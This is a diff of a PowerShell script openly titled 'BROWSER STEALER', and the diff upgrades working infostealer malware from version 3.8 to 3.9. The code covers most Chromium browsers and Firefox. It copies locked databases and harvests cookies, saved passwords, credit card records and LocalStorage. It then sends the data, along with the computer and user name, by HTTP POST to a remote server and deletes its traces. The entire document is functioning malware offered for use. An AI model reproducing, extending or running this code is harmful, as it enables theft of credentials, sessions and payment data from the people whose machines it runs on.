@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER v3.8 — WORKING
+# BROWSER STEALER v3.9 — FIXED: SQLite paths, LevelDB load order, lock handling
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -25,7 +25,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "BROWSER STEALER v3.8"
+Write-Log "BROWSER STEALER v3.9"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Log: $LOGFILE"
 Write-Log "============================================"
@@ -34,7 +34,7 @@ function Download-Dll {
     param($Url, $Path, $Name)
     Write-Log "Downloading $Name..."
     try {
-        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
+        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing -TimeoutSec 15
         [System.IO.File]::WriteAllBytes($Path, $response.Content)
         Write-Log "$Name downloaded"
         return $true
@@ -46,14 +46,17 @@ function Download-Dll {
 
 $sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
 $sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"
-if (-not $sqliteOk) { exit }
+if (-not $sqliteOk) { 
+    Write-Log "SQLite download failed — aborting"
+    exit 
+}
 
 $leveldbPath = "$DLL_DIR\LevelDB.netAll.dll"
 $leveldbOk = Download-Dll -Url $LEVELDB_DLL_URL -Path $leveldbPath -Name "LevelDB.NET"
 $leveldbNativePath = "$DLL_DIR\leveldb.dll"
 $nativeOk = Download-Dll -Url $LEVELDB_NATIVE_URL -Path $leveldbNativePath -Name "LevelDB native"
 
-$leveldbLoaded = ($leveldbOk -and $nativeOk)
+$leveldbLoaded = $false
 
 Write-Log "Loading SQLite..."
 try {
@@ -64,28 +67,89 @@ try {
     exit
 }
 
-if ($leveldbLoaded) {
+if ($leveldbOk -and $nativeOk) {
     Write-Log "Loading LevelDB..."
     try {
         [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
         Write-Log "LevelDB loaded"
+        $leveldbLoaded = $true
     } catch {
         Write-Log "LevelDB load failed: $_"
         $leveldbLoaded = $false
     }
 }
 
+# ---- Helper: find browser profile paths ----
+function Get-BrowserProfiles {
+    param($Browser)
+    $paths = @()
+    switch ($Browser) {
+        "Chrome" {
+            $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+            if (Test-Path $base) {
+                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $profiles) { $paths += $p.FullName }
+            }
+        }
+        "Edge" {
+            $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+            if (Test-Path $base) {
+                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $profiles) { $paths += $p.FullName }
+            }
+        }
+        "Brave" {
+            $base = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+            if (Test-Path $base) {
+                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $profiles) { $paths += $p.FullName }
+            }
+        }
+        "Opera" {
+            $base = "$env:LOCALAPPDATA\Opera Software\Opera Stable"
+            if (Test-Path $base) { $paths += $base }
+        }
+        "OperaGX" {
+            $base = "$env:LOCALAPPDATA\Opera Software\Opera GX Stable"
+            if (Test-Path $base) { $paths += $base }
+        }
+        "Vivaldi" {
+            $base = "$env:LOCALAPPDATA\Vivaldi\User Data"
+            if (Test-Path $base) { $paths += "$base\Default" }
+        }
+        "Arc" {
+            $base = "$env:LOCALAPPDATA\Arc\User Data"
+            if (Test-Path $base) { $paths += "$base\Default" }
+        }
+    }
+    return $paths
+}
+
+# ---- SQLite read with lock handling ----
 function Read-SQLite {
     param($DbPath, $Query)
     $result = @()
     if (-not (Test-Path $DbPath)) { return $result }
     try {
         $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
-        Copy-Item $DbPath $temp -Force
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
+        # Copy with retry if locked
+        $copied = $false
+        for ($i=0; $i -lt 5; $i++) {
+            try {
+                Copy-Item $DbPath $temp -Force -ErrorAction Stop
+                $copied = $true
+                break
+            } catch {
+                Start-Sleep -Milliseconds 200
+            }
+        }
+        if (-not $copied) { return $result }
+        
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;Read Only=True;")
         $conn.Open()
         $cmd = $conn.CreateCommand()
         $cmd.CommandText = $Query
+        $cmd.CommandTimeout = 5
         $rdr = $cmd.ExecuteReader()
         while ($rdr.Read()) {
             $row = @{}
@@ -100,7 +164,7 @@ function Read-SQLite {
         $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {
-        Write-Log "SQLite read error"
+        Write-Log "SQLite read error on $DbPath : $_"
     }
     return $result
 }
@@ -119,12 +183,14 @@ function Decrypt-BrowserPassword {
     }
 }
 
+# ---- BROWSER COOKIES ----
 function Get-BrowserCookies {
-    param($Path, $Name)
+    param($ProfilePath, $Name)
     $cookies = @()
-    if (-not (Test-Path $Path)) { return $cookies }
+    $cookieDb = "$ProfilePath\Network\Cookies"
+    if (-not (Test-Path $cookieDb)) { return $cookies }
     try {
-        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
+        $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host_key, name, value FROM cookies"
         foreach ($r in $rows) {
             if ($r['name'] -and $r['value']) {
                 $d = $r['host_key']
@@ -132,6 +198,7 @@ function Get-BrowserCookies {
                 $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
             }
         }
+        Write-Log "$Name cookies: $($cookies.Count) found"
     } catch {
         Write-Log "Error reading $Name cookies"
     }
@@ -155,6 +222,7 @@ function Get-FirefoxCookies {
                             $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                         }
                     }
+                    Write-Log "Firefox cookies: $($cookies.Count) found"
                 } catch {
                     Write-Log "Error reading Firefox cookies"
                 }
@@ -164,57 +232,15 @@ function Get-FirefoxCookies {
     return $cookies
 }
 
-function Get-FirefoxLocalStorage {
-    param($ProfPath)
-    $storage = @{}
-    $dbPath = "$ProfPath\webappsstore.sqlite"
-    if (Test-Path $dbPath) {
-        try {
-            $rows = Read-SQLite -DbPath $dbPath -Query "SELECT scope, key, value FROM webappsstore2"
-            foreach ($r in $rows) {
-                if ($r['key'] -and $r['value']) { $storage[$r['key']] = $r['value'] }
-            }
-            Write-Log "Firefox LocalStorage: $($storage.Count) items"
-        } catch {
-            Write-Log "Error reading Firefox LocalStorage"
-        }
-    }
-    return $storage
-}
-
-function Get-ChromeLocalStorage {
-    param($Path, $Name)
-    $storage = @{}
-    if (-not $leveldbLoaded) { return $storage }
-    $leveldbPath = "$Path\Local Storage\leveldb\"
-    if (-not (Test-Path $leveldbPath)) { return $storage }
-    Write-Log "Reading $Name LocalStorage..."
-    try {
-        $options = New-Object LevelDB.NET.Options
-        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
-        $iterator = $db.CreateIterator()
-        $iterator.SeekToFirst()
-        while ($iterator.Next()) {
-            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
-            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
-            $storage[$key] = $value
-        }
-        $iterator.Dispose()
-        $db.Dispose()
-        Write-Log "$Name LocalStorage: $($storage.Count) items"
-    } catch {
-        Write-Log "Error reading $Name LocalStorage: $_"
-    }
-    return $storage
-}
-
+# ---- BROWSER PASSWORDS ----
 function Get-BrowserPasswords {
-    param($Path, $Name)
+    param($ProfilePath, $Name)
     $pass = @()
-    if (-not (Test-Path $Path)) { return $pass }
+    $loginDb = "$ProfilePath\Login Data"
+    if (-not (Test-Path $loginDb)) { return $pass }
     Write-Log "Reading $Name passwords..."
     try {
-        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
+        $rows = Read-SQLite -DbPath $loginDb -Query "SELECT origin_url, username_value, password_value FROM logins"
         foreach ($r in $rows) {
             $username = $r['username_value']
             $encryptedPassword = $r['password_value']
@@ -225,7 +251,7 @@ function Get-BrowserPasswords {
                 $decryptedPassword = $encryptedPassword
             }
             if (-not $decryptedPassword -and $encryptedPassword) {
-                $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
+                try { $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword) } catch {}
             }
             if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
@@ -267,24 +293,25 @@ function Get-FirefoxPasswords {
     return $pass
 }
 
-function Get-OperaPasswords {
-    $pass = @()
-    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
-    if (Test-Path $path) {
-        $pass += Get-BrowserPasswords -Path $path -Name "Opera"
-    }
-    return $pass
-}
-
+# ---- BROWSER CARDS ----
 function Get-BrowserCards {
-    param($Path, $Name)
+    param($ProfilePath, $Name)
     $cards = @()
-    if (-not (Test-Path $Path)) { return $cards }
+    $webData = "$ProfilePath\Web Data"
+    if (-not (Test-Path $webData)) { return $cards }
     try {
-        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
+        $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
-                $cards += @{ name = $r['name_on_card']; value = $r['card_number_encrypted']; type = "card-number"; url = $Name; browser = $Name; month = $r['expiration_month']; year = $r['expiration_year'] }
+                $cards += @{ 
+                    name = $r['name_on_card']; 
+                    value = $r['card_number_encrypted']; 
+                    type = "card-number"; 
+                    url = $Name; 
+                    browser = $Name; 
+                    month = $r['expiration_month']; 
+                    year = $r['expiration_year'] 
+                }
             }
         }
     } catch {
@@ -293,104 +320,112 @@ function Get-BrowserCards {
     return $cards
 }
 
-function Get-FirefoxProfiles {
-    $profiles = @()
-    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $profPath) {
-        $dirs = Get-ChildItem $profPath -Directory
-        foreach ($d in $dirs) {
-            $profiles += $d.FullName
+# ---- LOCALSTORAGE (LevelDB) ----
+function Get-ChromeLocalStorage {
+    param($ProfilePath, $Name)
+    $storage = @{}
+    if (-not $leveldbLoaded) { return $storage }
+    $leveldbPath = "$ProfilePath\Local Storage\leveldb\"
+    if (-not (Test-Path $leveldbPath)) { return $storage }
+    Write-Log "Reading $Name LocalStorage..."
+    try {
+        $options = New-Object LevelDB.NET.Options
+        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
+        $iterator = $db.CreateIterator()
+        $iterator.SeekToFirst()
+        while ($iterator.Next()) {
+            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
+            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
+            $storage[$key] = $value
         }
+        $iterator.Dispose()
+        $db.Dispose()
+        Write-Log "$Name LocalStorage: $($storage.Count) items"
+    } catch {
+        Write-Log "Error reading $Name LocalStorage: $_"
     }
-    return $profiles
+    return $storage
 }
 
+function Get-FirefoxLocalStorage {
+    param($ProfPath)
+    $storage = @{}
+    $dbPath = "$ProfPath\webappsstore.sqlite"
+    if (Test-Path $dbPath) {
+        try {
+            $rows = Read-SQLite -DbPath $dbPath -Query "SELECT scope, key, value FROM webappsstore2"
+            foreach ($r in $rows) {
+                if ($r['key'] -and $r['value']) { $storage[$r['key']] = $r['value'] }
+            }
+            Write-Log "Firefox LocalStorage: $($storage.Count) items"
+        } catch {
+            Write-Log "Error reading Firefox LocalStorage"
+        }
+    }
+    return $storage
+}
+
+# ---- COLLECT DATA ----
 $allCookies = @()
 $allPasswords = @()
 $allCards = @()
 $allLocalStorage = @{}
 
 Write-Log ""
-Write-Log "Chrome cookies..."
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"
 
-Write-Log "Edge cookies..."
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -Path $path -Name "Edge"
-
-Write-Log "Brave cookies..."
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-$allCookies += Get-BrowserCookies -Path $path -Name "Brave"
-
-Write-Log "Opera cookies..."
-$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
-$allCookies += Get-BrowserCookies -Path $path -Name "Opera"
-
-Write-Log "Firefox cookies..."
-$allCookies += Get-FirefoxCookies
-
-Write-Log "Chrome passwords..."
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"
-
-Write-Log "Edge passwords..."
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"
-
-Write-Log "Brave passwords..."
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"
-
-Write-Log "Opera passwords..."
-$allPasswords += Get-OperaPasswords
-
-Write-Log "Firefox passwords..."
-$allPasswords += Get-FirefoxPasswords
-
-Write-Log "Chrome cards..."
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
-$allCards += Get-BrowserCards -Path $path -Name "Chrome"
-
-Write-Log "Edge cards..."
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
-$allCards += Get-BrowserCards -Path $path -Name "Edge"
-
-Write-Log "Brave cards..."
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
-$allCards += Get-BrowserCards -Path $path -Name "Brave"
-
-Write-Log ""
-Write-Log "Chrome LocalStorage..."
-$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-$chromeLs = Get-ChromeLocalStorage -Path $path -Name "Chrome"
-foreach ($key in $chromeLs.Keys) {
-    $allLocalStorage["Chrome:$key"] = $chromeLs[$key]
-}
-
-Write-Log "Edge LocalStorage..."
-$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-$edgeLs = Get-ChromeLocalStorage -Path $path -Name "Edge"
-foreach ($key in $edgeLs.Keys) {
-    $allLocalStorage["Edge:$key"] = $edgeLs[$key]
-}
-
-Write-Log "Brave LocalStorage..."
-$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-$braveLs = Get-ChromeLocalStorage -Path $path -Name "Brave"
-foreach ($key in $braveLs.Keys) {
-    $allLocalStorage["Brave:$key"] = $braveLs[$key]
-}
-
-Write-Log "Firefox LocalStorage..."
-$profiles = Get-FirefoxProfiles
-foreach ($prof in $profiles) {
-    $ffLs = Get-FirefoxLocalStorage -ProfPath $prof
-    foreach ($key in $ffLs.Keys) {
-        $allLocalStorage["Firefox:$key"] = $ffLs[$key]
+# Cookies — Chrome/Edge/Brave/Opera profiles
+$browsers = @("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Arc")
+foreach ($b in $browsers) {
+    $profiles = Get-BrowserProfiles -Browser $b
+    foreach ($prof in $profiles) {
+        $allCookies += Get-BrowserCookies -ProfilePath $prof -Name $b
     }
 }
 
+# Firefox cookies
+$allCookies += Get-FirefoxCookies
+
+# Passwords — Chrome/Edge/Brave
+$browsersPass = @("Chrome", "Edge", "Brave")
+foreach ($b in $browsersPass) {
+    $profiles = Get-BrowserProfiles -Browser $b
+    foreach ($prof in $profiles) {
+        $allPasswords += Get-BrowserPasswords -ProfilePath $prof -Name $b
+    }
+}
+$allPasswords += Get-FirefoxPasswords
+
+# Cards — Chrome/Edge/Brave
+$browsersCards = @("Chrome", "Edge", "Brave")
+foreach ($b in $browsersCards) {
+    $profiles = Get-BrowserProfiles -Browser $b
+    foreach ($prof in $profiles) {
+        $allCards += Get-BrowserCards -ProfilePath $prof -Name $b
+    }
+}
+
+# LocalStorage — Chrome/Edge/Brave
+$browsersLs = @("Chrome", "Edge", "Brave")
+foreach ($b in $browsersLs) {
+    $profiles = Get-BrowserProfiles -Browser $b
+    foreach ($prof in $profiles) {
+        $ls = Get-ChromeLocalStorage -ProfilePath $prof -Name $b
+        foreach ($key in $ls.Keys) {
+            $allLocalStorage["$b`:$key"] = $ls[$key]
+        }
+    }
+}
+
+# Firefox LocalStorage
+$profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
+foreach ($prof in $profiles) {
+    $ffLs = Get-FirefoxLocalStorage -ProfPath $prof.FullName
+    foreach ($key in $ffLs.Keys) {
+        $allLocalStorage["Firefox`:$key"] = $ffLs[$key]
+    }
+}
+
+# ---- SUMMARY ----
 Write-Log ""
 Write-Log "============================================"
 Write-Log "SUMMARY"
@@ -401,6 +436,7 @@ Write-Log "Cards: $($allCards.Count)"
 Write-Log "LocalStorage: $($allLocalStorage.Count)"
 Write-Log "============================================"
 
+# ---- BUILD PAYLOAD ----
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
@@ -442,6 +478,7 @@ $payload = @{
     nonce = [System.Guid]::NewGuid().ToString()
 }
 
+# ---- SEND ----
 Write-Log "Sending data..."
 try {
     $json = $payload | ConvertTo-Json -Depth 10
@@ -451,6 +488,7 @@ try {
     $req.Method = "POST"
     $req.ContentType = "application/json"
     $req.ContentLength = $bytes.Length
+    $req.Timeout = 15000
     $stream = $req.GetRequestStream()
     $stream.Write($bytes, 0, $bytes.Length)
     $stream.Close()
@@ -461,6 +499,7 @@ try {
     Write-Log "Send failed: $_"
 }
 
+# ---- CLEANUP ----
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
 
